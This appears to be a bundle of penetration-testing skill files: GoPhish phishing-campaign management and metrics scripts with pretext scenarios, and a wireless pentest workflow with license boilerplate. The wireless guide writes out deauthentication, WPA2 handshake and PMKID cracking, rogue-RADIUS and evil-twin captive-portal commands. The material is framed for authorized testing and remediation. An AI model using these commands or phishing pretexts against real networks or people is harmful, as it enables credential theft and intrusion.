| Physical | Badge cloning, tailgating |
| USB Drops | Rubber Ducky, USB armory |

## External References

- [GoPhish API Documentation](https://docs.getgophish.com/api-documentation/)
- [SANS Social Engineering Framework](https://www.social-engineer.org/framework/)
- [MITRE ATT&CK Phishing T1566](https://attack.mitre.org/techniques/T1566/)

===== END FILE =====


===== FILE: skills/conducting-social-engineering-penetration-test/references/standards.md =====
# Standards — Social Engineering Penetration Testing

## Frameworks
- PTES Social Engineering Section: http://www.pentest-standard.org/index.php/Social_Engineering
- NIST SP 800-50: Building an Information Technology Security Awareness and Training Program
- SANS Security Awareness Maturity Model
- MITRE ATT&CK Initial Access: https://attack.mitre.org/tactics/TA0001/

## MITRE ATT&CK Techniques
| Technique | ID | Vector |
|-----------|----|--------|
| Phishing: Spear Phishing Link | T1566.002 | Email with malicious URL |
| Phishing: Spear Phishing Attachment | T1566.001 | Email with payload |
| Phishing: Spear Phishing via Service | T1566.003 | Social media / messaging |

## Legal Considerations
- Must have explicit written authorization
- Cannot target personal email or devices without consent
- GDPR compliance for EU employees
- Cannot use real malware or destructive payloads
- Results must be anonymized in reporting to protect individuals

===== END FILE =====


===== FILE: skills/conducting-social-engineering-penetration-test/references/workflows.md =====
# Workflows — Social Engineering Penetration Testing

## Campaign Lifecycle
```
Authorization & Scoping
    │
    ├── OSINT & Target Profiling
    │   ├── Email harvesting
    │   ├── LinkedIn/social media reconnaissance
    │   └── Target group selection
    │
    ├── Infrastructure Setup
    │   ├── Domain registration (lookalike)
    │   ├── GoPhish/Evilginx deployment
    │   ├── SMTP configuration (SPF/DKIM)
    │   └── Landing page creation
    │
    ├── Campaign Execution
    │   ├── Phishing emails (batched sends)
    │   ├── Vishing calls
    │   ├── Physical pretexting
    │   └── USB drops
    │
    ├── Monitoring & Data Collection
    │   ├── Email opens/clicks tracking
    │   ├── Credential captures
    │   ├── Call recordings/notes
    │   └── Physical access logs
    │
    └── Reporting & Training
        ├── Metrics compilation
        ├── Risk scoring
        ├── Executive report
        └── Targeted training recommendations
```

===== END FILE =====


===== FILE: skills/conducting-social-engineering-penetration-test/scripts/agent.py =====
#!/usr/bin/env python3
"""Social engineering penetration test management agent using GoPhish API."""

import json
import sys
import argparse
from datetime import datetime

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("Install: pip install requests")
    sys.exit(1)


class GoPhishClient:
    """GoPhish API client for phishing campaign management."""

    def __init__(self, base_url, api_key):
        self.base_url = base_url.rstrip("/")
        self.headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}

    def _get(self, endpoint):
        resp = requests.get(f"{self.base_url}/api/{endpoint}", headers=self.headers, verify=False, timeout=30)
        resp.raise_for_status()
        return resp.json()

    def _post(self, endpoint, data):
        resp = requests.post(f"{self.base_url}/api/{endpoint}", headers=self.headers,
                             json=data, verify=False, timeout=30)
        resp.raise_for_status()
        return resp.json()

    def list_campaigns(self):
        return self._get("campaigns/")

    def get_campaign_results(self, campaign_id):
        return self._get(f"campaigns/{campaign_id}/results")

    def create_sending_profile(self, name, host, from_addr, username, password):
        return self._post("smtp/", {
            "name": name, "host": host, "from_address": from_addr,
            "username": username, "password": password, "ignore_cert_errors": True,
        })

    def create_template(self, name, subject, html, text=""):
        return self._post("templates/", {
            "name": name, "subject": subject, "html": html, "text": text,
        })

    def create_group(self, name, targets):
        return self._post("groups/", {
            "name": name,
            "targets": [{"email": t["email"], "first_name": t.get("first_name", ""),
                         "last_name": t.get("last_name", "")} for t in targets],
        })


def analyze_campaign_results(results):
    """Analyze phishing campaign results for metrics."""
    stats = {"total": 0, "sent": 0, "opened": 0, "clicked": 0, "submitted": 0, "reported": 0}
    for r in results:
        stats["total"] += 1
        status = r.get("status", "").lower()
        if status == "email sent":
            stats["sent"] += 1
        elif status == "email opened":
            stats["opened"] += 1
        elif status == "clicked link":
            stats["clicked"] += 1
        elif status == "submitted data":
            stats["submitted"] += 1
    if stats["sent"] > 0:
        stats["open_rate"] = round(stats["opened"] / stats["sent"] * 100, 1)
        stats["click_rate"] = round(stats["clicked"] / stats["sent"] * 100, 1)
        stats["submit_rate"] = round(stats["submitted"] / stats["sent"] * 100, 1)
    return stats


def generate_pretext_scenarios():
    """Generate social engineering pretext scenarios for testing."""
    return [
        {
            "scenario": "IT Password Reset",
            "pretext": "IT department requires immediate password reset due to security incident",
            "vector": "email",
            "urgency": "high",
            "success_indicator": "User clicks link and enters credentials",
        },
        {
            "scenario": "CEO Wire Transfer",
            "pretext": "CEO requests urgent wire transfer for confidential acquisition",
            "vector": "email",
            "urgency": "high",
            "success_indicator": "User initiates transfer or reveals banking info",
        },
        {
            "scenario": "Vendor Invoice",
            "pretext": "Known vendor sends updated invoice with changed payment details",
            "vector": "email",
            "urgency": "medium",
            "success_indicator": "User opens attachment or clicks payment link",
        },
        {
            "scenario": "Physical Tailgating",
            "pretext": "Contractor with clipboard requests building access",
            "vector": "physical",
            "urgency": "low",
            "success_indicator": "Employee holds door without badge verification",
        },
    ]


def run_assessment(base_url=None, api_key=None, campaign_id=None):
    """Execute social engineering assessment analysis."""
    print(f"\n{'='*60}")
    print(f"  SOCIAL ENGINEERING PENETRATION TEST")
    print(f"  Generated: {datetime.utcnow().isoformat()} UTC")
    print(f"{'='*60}\n")

    if base_url and api_key:
        client = GoPhishClient(base_url, api_key)
        campaigns = client.list_campaigns()
        print(f"--- CAMPAIGNS ({len(campaigns)}) ---")
        for c in campaigns[:5]:
            print(f"  {c['name']}: {c['status']}")

        if campaign_id:
            results = client.get_campaign_results(campaign_id)
            stats = analyze_campaign_results(results)
            print(f"\n--- CAMPAIGN METRICS ---")
            for k, v in stats.items():
                print(f"  {k}: {v}")

    scenarios = generate_pretext_scenarios()
    print(f"\n--- PRETEXT SCENARIOS ({len(scenarios)}) ---")
    for s in scenarios:
        print(f"  [{s['urgency'].upper()}] {s['scenario']}: {s['vector']}")

    return {"scenarios": scenarios}


def main():
    parser = argparse.ArgumentParser(description="Social Engineering Pentest Agent")
    parser.add_argument("--gophish-url", help="GoPhish server URL")
    parser.add_argument("--api-key", help="GoPhish API key")
    parser.add_argument("--campaign-id", type=int, help="Campaign ID for results")
    parser.add_argument("--output", help="Save report to JSON file")
    args = parser.parse_args()

    report = run_assessment(args.gophish_url, args.api_key, args.campaign_id)
    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/conducting-social-engineering-penetration-test/scripts/process.py =====
#!/usr/bin/env python3
"""
Social Engineering Penetration Test — Campaign Metrics Processor

Processes GoPhish campaign results and generates analysis reports.
Requires: requests library for GoPhish API interaction.

Usage:
    python process.py --gophish-url https://localhost:3333 --api-key <key> --output ./results
"""

import json
import csv
import argparse
import datetime
from pathlib import Path
from typing import Optional

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("Install requests: pip install requests")
    raise


class GoPhishClient:
    """Client for GoPhish REST API."""

    def __init__(self, base_url: str, api_key: str):
        self.base_url = base_url.rstrip("/")
        self.headers = {"Authorization": f"Bearer {api_key}"}
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.verify = False

    def get_campaigns(self) -> list[dict]:
        resp = self.session.get(f"{self.base_url}/api/campaigns/")
        resp.raise_for_status()
        return resp.json()

    def get_campaign(self, campaign_id: int) -> dict:
        resp = self.session.get(f"{self.base_url}/api/campaigns/{campaign_id}")
        resp.raise_for_status()
        return resp.json()

    def get_campaign_results(self, campaign_id: int) -> dict:
        resp = self.session.get(f"{self.base_url}/api/campaigns/{campaign_id}/results")
        resp.raise_for_status()
        return resp.json()


def analyze_campaign(campaign: dict) -> dict:
    """Analyze a single campaign's results."""
    results = campaign.get("results", [])
    timeline = campaign.get("timeline", [])

    stats = {
        "campaign_name": campaign.get("name", "Unknown"),
        "total_targets": len(results),
        "emails_sent": 0,
        "emails_opened": 0,
        "links_clicked": 0,
        "credentials_submitted": 0,
        "emails_reported": 0,
        "errors": 0,
    }

    for entry in results:
        status = entry.get("status", "")
        if status == "Email Sent" or status in ("Email Opened", "Clicked Link",
                                                  "Submitted Data", "Email Reported"):
            stats["emails_sent"] += 1
        if status in ("Email Opened", "Clicked Link", "Submitted Data"):
            stats["emails_opened"] += 1
        if status in ("Clicked Link", "Submitted Data"):
            stats["links_clicked"] += 1
        if status == "Submitted Data":
            stats["credentials_submitted"] += 1
        if status == "Email Reported":
            stats["emails_reported"] += 1
        if status == "Error":
            stats["errors"] += 1

    # Calculate rates
    total = stats["total_targets"]
    if total > 0:
        stats["open_rate"] = round(stats["emails_opened"] / total * 100, 1)
        stats["click_rate"] = round(stats["links_clicked"] / total * 100, 1)
        stats["submit_rate"] = round(stats["credentials_submitted"] / total * 100, 1)
        stats["report_rate"] = round(stats["emails_reported"] / total * 100, 1)
    else:
        stats["open_rate"] = stats["click_rate"] = stats["submit_rate"] = stats["report_rate"] = 0

    return stats


def analyze_by_department(results: list[dict]) -> dict[str, dict]:
    """Break down results by department/position."""
    departments = {}
    for entry in results:
        dept = entry.get("position", "Unknown")
        if dept not in departments:
            departments[dept] = {
                "total": 0, "clicked": 0, "submitted": 0, "reported": 0
            }
        departments[dept]["total"] += 1
        status = entry.get("status", "")
        if status in ("Clicked Link", "Submitted Data"):
            departments[dept]["clicked"] += 1
        if status == "Submitted Data":
            departments[dept]["submitted"] += 1
        if status == "Email Reported":
            departments[dept]["reported"] += 1

    return departments


def generate_report(stats: dict, dept_analysis: dict, output_dir: Path) -> str:
    """Generate campaign analysis report."""
    report_file = output_dir / "se_campaign_report.md"
    timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    with open(report_file, "w") as f:
        f.write("# Social Engineering Campaign Analysis Report\n\n")
        f.write(f"**Campaign:** {stats['campaign_name']}\n")
        f.write(f"**Generated:** {timestamp}\n\n---\n\n")

        f.write("## Campaign Metrics\n\n")
        f.write("| Metric | Count | Rate |\n")
        f.write("|--------|-------|------|\n")
        f.write(f"| Targets | {stats['total_targets']} | 100% |\n")
        f.write(f"| Emails Sent | {stats['emails_sent']} | — |\n")
        f.write(f"| Emails Opened | {stats['emails_opened']} | {stats['open_rate']}% |\n")
        f.write(f"| Links Clicked | {stats['links_clicked']} | {stats['click_rate']}% |\n")
        f.write(f"| Credentials Submitted | {stats['credentials_submitted']} | {stats['submit_rate']}% |\n")
        f.write(f"| Reported to Security | {stats['emails_reported']} | {stats['report_rate']}% |\n\n")

        f.write("## Department Breakdown\n\n")
        f.write("| Department | Total | Clicked | Submitted | Reported |\n")
        f.write("|-----------|-------|---------|-----------|----------|\n")
        for dept, data in sorted(dept_analysis.items()):
            f.write(f"| {dept} | {data['total']} | {data['clicked']} | {data['submitted']} | {data['reported']} |\n")
        f.write("\n")

        f.write("## Risk Assessment\n\n")
        if stats["submit_rate"] > 20:
            risk = "CRITICAL"
        elif stats["submit_rate"] > 10:
            risk = "HIGH"
        elif stats["submit_rate"] > 5:
            risk = "MEDIUM"
        else:
            risk = "LOW"
        f.write(f"**Overall Risk Level: {risk}**\n\n")

        f.write("## Recommendations\n\n")
        f.write("1. Deploy phishing-resistant MFA (FIDO2/WebAuthn)\n")
        f.write("2. Implement targeted training for high-risk departments\n")
        f.write("3. Deploy email security gateway with URL sandboxing\n")
        f.write("4. Establish phishing report button and reward program\n")
        f.write("5. Conduct quarterly phishing simulations\n")

    print(f"[+] Report: {report_file}")
    return str(report_file)


def main():
    parser = argparse.ArgumentParser(description="SE Campaign Analysis")
    parser.add_argument("--gophish-url", default="https://localhost:3333")
    parser.add_argument("--api-key", required=True)
    parser.add_argument("--campaign-id", type=int, help="Specific campaign ID")
    parser.add_argument("--output", default="./results")
    args = parser.parse_args()

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    client = GoPhishClient(args.gophish_url, args.api_key)

    if args.campaign_id:
        campaign = client.get_campaign(args.campaign_id)
        stats = analyze_campaign(campaign)
        dept_analysis = analyze_by_department(campaign.get("results", []))
        generate_report(stats, dept_analysis, output_dir)
    else:
        campaigns = client.get_campaigns()
        for campaign in campaigns:
            stats = analyze_campaign(campaign)
            dept_analysis = analyze_by_department(campaign.get("results", []))
            generate_report(stats, dept_analysis, output_dir)
            print(f"[+] Processed campaign: {campaign.get('name')}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/conducting-wireless-network-penetration-test/SKILL.md =====
---
name: conducting-wireless-network-penetration-test
description: 'Conducts authorized wireless network penetration tests to assess the
  security of WiFi infrastructure by testing for weak encryption protocols, captive
  portal bypasses, evil twin attacks, WPA2/WPA3 handshake capture, rogue access point
  detection, and client-side attacks. The tester evaluates wireless authentication,
  network segmentation, and the effectiveness of wireless intrusion detection systems.
  Activates for requests involving wireless pentest, WiFi security assessment, WPA2/WPA3
  testing, or rogue access point detection.

  '
domain: cybersecurity
subdomain: penetration-testing
tags:
- wireless-pentest
- WiFi-security
- WPA2
- WPA3
- evil-twin
version: 1.0.0
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1557.004
- T1040
- T1110.002
- T1557
- T1669
---
# Conducting Wireless Network Penetration Test

## When to Use

- Assessing the security of enterprise wireless networks including guest, corporate, and IoT WiFi segments
- Testing whether attackers within physical proximity can compromise wireless authentication and access internal networks
- Validating wireless intrusion detection/prevention system (WIDS/WIPS) capabilities against known attack techniques
- Evaluating the effectiveness of WPA3 migration and transition mode configurations
- Testing network segmentation between wireless and wired networks after a wireless network compromise

**Do not use** against wireless networks without written authorization from the network owner, for jamming or denial-of-service attacks against wireless infrastructure unless explicitly authorized, or in environments where wireless disruption could affect life-safety systems.

## Prerequisites

- Written authorization specifying target SSIDs, BSSIDs, and physical testing locations
- External WiFi adapter supporting monitor mode and packet injection (Alfa AWUS036ACH, TP-Link TL-WN722N v1)
- Kali Linux or equivalent with up-to-date wireless tools (aircrack-ng suite, hostapd, bettercap)
- Physical access to the testing location during authorized testing hours
- Knowledge of the target's wireless architecture (SSIDs, authentication types, RADIUS infrastructure)

## Workflow

### Step 1: Wireless Reconnaissance

Discover and map all wireless networks in the target environment:

- Enable monitor mode: `airmon-ng start wlan0`
- Capture wireless traffic: `airodump-ng wlan0mon -w recon --output-format csv,pcap` to discover all SSIDs, BSSIDs, channels, encryption types, and connected clients
- Identify target networks from the authorized scope and note their security configurations (WEP, WPA2-Personal, WPA2-Enterprise, WPA3-SAE, WPA3-Transition)
- Enumerate connected clients and their signal strengths to understand client distribution
- Check for hidden SSIDs by capturing probe requests from clients: `airodump-ng wlan0mon --essid-regex ".*" -c <channel>`
- Identify rogue access points by comparing discovered BSSIDs against the client's authorized AP inventory

### Step 2: WPA2-Personal Handshake Capture and Cracking

For WPA2-PSK networks, capture the 4-way handshake and attempt offline cracking:

- Target the specific AP: `airodump-ng wlan0mon -c <channel> --bssid <bssid> -w capture`
- Deauthenticate a connected client to force re-authentication: `aireplay-ng -0 5 -a <bssid> -c <client_mac> wlan0mon`
- Verify handshake capture in airodump-ng (WPA handshake indicator appears)
- Crack the captured handshake:
  - Dictionary attack: `aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap`
  - GPU-accelerated: `hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt`
  - Rule-based: `hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule`
- For PMKID capture (clientless): `hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng --filtermode=2 --filterlist_ap=<bssid>`

### Step 3: WPA2-Enterprise Attack

For 802.1X/EAP networks, attempt credential capture through rogue RADIUS:

- Identify the EAP type in use (PEAP-MSCHAPv2, EAP-TLS, EAP-TTLS) by capturing association requests
- Set up a rogue AP mimicking the enterprise SSID using `hostapd-mana` with a rogue RADIUS server
- Configure hostapd-mana to accept all EAP authentication attempts and capture RADIUS handshakes
- When clients connect to the rogue AP, capture MSCHAPv2 challenge-response pairs
- Crack captured credentials with `asleap` or convert to hashcat format: `hashcat -m 5500 captured_ntlm.txt wordlist.txt`
- If EAP-TLS is in use (certificate-based), document that credential capture is not feasible and the organization has implemented strong wireless authentication

### Step 4: Evil Twin Attack

Deploy a rogue access point to intercept client connections:

- Create an evil twin AP matching the target SSID: configure `hostapd` with the same SSID and channel
- Set up a captive portal using `dnsmasq` for DHCP and DNS, and a web server presenting a fake login page
- Deauthenticate clients from the legitimate AP to force reconnection to the evil twin
- Capture credentials submitted through the captive portal
- For WPA3-Transition mode networks: exploit the downgrade vulnerability by creating a WPA2-only evil twin that transition-mode clients will connect to
- Document all captured credentials and the attack path from wireless access to internal network

### Step 5: Post-Compromise Network Assessment

After gaining wireless network access, assess network segmentation:

- Connect to the compromised wireless network using captured credentials
- Scan the network segment for accessible hosts and services: `nmap -sn <wireless_subnet>`
- Test if wireless clients can reach internal servers, databases, or management interfaces
- Verify that VLAN segmentation properly isolates guest, corporate, and IoT wireless networks
- Test if wireless-to-wired segmentation is enforced by attempting to access servers on the wired network
- Document all accessible resources from the wireless network to demonstrate segmentation failures

## Key Concepts

| Term | Definition |
|------|------------|
| **Evil Twin** | A rogue access point that mimics a legitimate SSID to trick clients into connecting, enabling man-in-the-middle attacks and credential capture |
| **4-Way Handshake** | The WPA2 authentication exchange between client and AP that establishes encryption keys; captured handshakes can be cracked offline |
| **WPA3-SAE** | Simultaneous Authentication of Equals; WPA3's key exchange protocol that resists offline dictionary attacks and provides forward secrecy |
| **Transition Mode** | WPA3 backward compatibility mode that supports both WPA2 and WPA3 clients, potentially vulnerable to downgrade attacks |
| **PMKID Attack** | A clientless attack that captures the Pairwise Master Key Identifier from the AP's first EAPOL frame, allowing offline cracking without capturing a full handshake |
| **802.1X/EAP** | Enterprise wireless authentication using RADIUS and Extensible Authentication Protocol, providing per-user credentials instead of a shared pre-shared key |
| **Deauthentication Attack** | Sending spoofed deauthentication frames to disconnect clients from an AP, forcing them to reconnect and enabling handshake capture or evil twin attacks |

## Tools & Systems

- **Aircrack-ng Suite**: Comprehensive wireless auditing toolkit including airodump-ng (capture), aireplay-ng (injection), and aircrack-ng (cracking)
- **Hostapd-mana**: Modified hostapd for creating rogue access points with EAP credential capture capability
- **Bettercap**: Network attack framework with WiFi modules for deauthentication, handshake capture, and evil twin deployment
- **Hashcat**: GPU-accelerated password cracking supporting WPA2 (mode 22000), MSCHAPv2 (mode 5500), and PMKID formats
- **Kismet**: Wireless network detector, sniffer, and intrusion detection system for passive monitoring

## Common Scenarios

### Scenario: Wireless Security Assessment for a Corporate Office

**Context**: A financial services company has 3 SSIDs: CorpWiFi (WPA2-Enterprise for employees), GuestWiFi (captive portal), and IoT-Net (WPA2-PSK for printers and conferencing systems). The tester is authorized to test all three networks from the lobby and conference rooms.

**Approach**:
1. Wireless reconnaissance identifies all 3 SSIDs across 12 access points with 87 connected clients
2. IoT-Net WPA2-PSK handshake captured and cracked in 3 minutes (password: Company2024!)
3. From IoT-Net, scan reveals the subnet can reach internal servers including the print server and file shares, demonstrating inadequate segmentation
4. Evil twin attack against CorpWiFi captures 4 employee MSCHAPv2 hashes via hostapd-mana; 2 are cracked revealing passwords
5. GuestWiFi captive portal bypass achieved using MAC address spoofing of an already-authenticated device
6. Document that IoT-Net provides a direct path to the internal network bypassing WPA2-Enterprise authentication

**Pitfalls**:
- Conducting deauthentication attacks during business hours without coordinating with the client, causing visible WiFi disruptions
- Not testing WPA3 transition mode for downgrade vulnerabilities when the organization has begun WPA3 migration
- Focusing only on password cracking and missing network segmentation issues that are often the higher-risk finding
- Testing from a single location and missing rogue APs deployed in other areas of the facility

## Output Format

```
## Finding: Weak WPA2-PSK on IoT Network with Inadequate Segmentation

**ID**: WIFI-001
**Severity**: Critical (CVSS 9.4)
**Affected SSID**: IoT-Net (BSSID: AA:BB:CC:DD:EE:FF)
**Encryption**: WPA2-Personal (PSK)

**Description**:
The IoT wireless network uses a weak pre-shared key that was cracked in 3 minutes
using a standard dictionary attack. Once connected to IoT-Net, the tester discovered
that the wireless VLAN is not properly segmented from the internal corporate network,
providing unrestricted access to file servers, the Active Directory domain controller,
and the internal database server.

**Proof of Concept**:
1. Captured WPA2 handshake: airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w iot
2. Cracked PSK in 3 minutes: aircrack-ng -w rockyou.txt iot-01.cap -> Key: Company2024!
3. Connected to IoT-Net and scanned: nmap -sn 10.20.0.0/24
4. Accessible from IoT-Net: DC01 (10.20.0.5:445), FILESVR (10.20.0.10:445), DBSVR (10.20.0.15:3306)

**Impact**:
An attacker within wireless range (tested from the public lobby) can join the IoT
network and gain direct network access to the corporate infrastructure, bypassing
the WPA2-Enterprise authentication required for employee access.

**Remediation**:
1. Implement a complex 20+ character PSK for IoT-Net, rotated quarterly
2. Deploy VLAN segmentation to isolate IoT-Net from the corporate network
3. Implement firewall rules allowing IoT devices to reach only their required services
4. Migrate IoT devices to 802.1X authentication with device certificates where supported
5. Deploy WIDS to detect deauthentication attacks and rogue access points
```

===== END FILE =====


===== FILE: skills/conducting-wireless-network-penetration-test/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/conducting-wireless-network-penetration-test/references/api-reference.md =====
# API Reference: Wireless Network Penetration Testing Agent

## Overview

Tests WiFi security: scans access points via beacon capture, detects rogue APs and evil twins, identifies weak encryption, captures WPA2 handshakes, and analyzes client probe requests. For authorized testing only.

## Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| scapy | >=2.5 | Beacon/probe capture, deauth frames |
| aircrack-ng | >=1.7 | Handshake capture and cracking (subprocess) |

## CLI Usage

```bash
# Enable monitor mode first
sudo airmon-ng start wlan0

# Run wireless pentest
python agent.py --interface wlan0mon --duration 60 \
  --known-ssids "CorpWiFi" "GuestWiFi" \
  --known-bssids "AA:BB:CC:DD:EE:FF" --output report.json
```

## Key Functions

### `scan_access_points(interface, duration)`
Captures Dot11Beacon frames to discover APs with SSID, BSSID, channel, and crypto type.

### `detect_rogue_aps(discovered_aps, known_ssids, known_bssids)`
Compares discovered APs against known infrastructure to detect evil twin attacks.

### `detect_weak_encryption(access_points)`
Flags open networks, WEP, and WPA1-only configurations as weak.

### `capture_handshake(interface, target_bssid, channel, output_file, duration)`
Uses airodump-ng to capture the WPA2 4-way handshake.

### `send_deauth(interface, target_bssid, client_mac, count)`
Sends deauthentication frames via Scapy to force client reconnection.

### `crack_handshake(cap_file, wordlist)`
Attempts dictionary attack on captured handshake using aircrack-ng.

### `detect_client_probes(interface, duration)`
Captures Dot11ProbeReq frames to identify SSIDs clients are seeking.

### `check_wps_enabled(interface, target_bssid)`
Uses wash to detect WPS-enabled access points vulnerable to Reaver attacks.

## Scapy 802.11 Layers Used

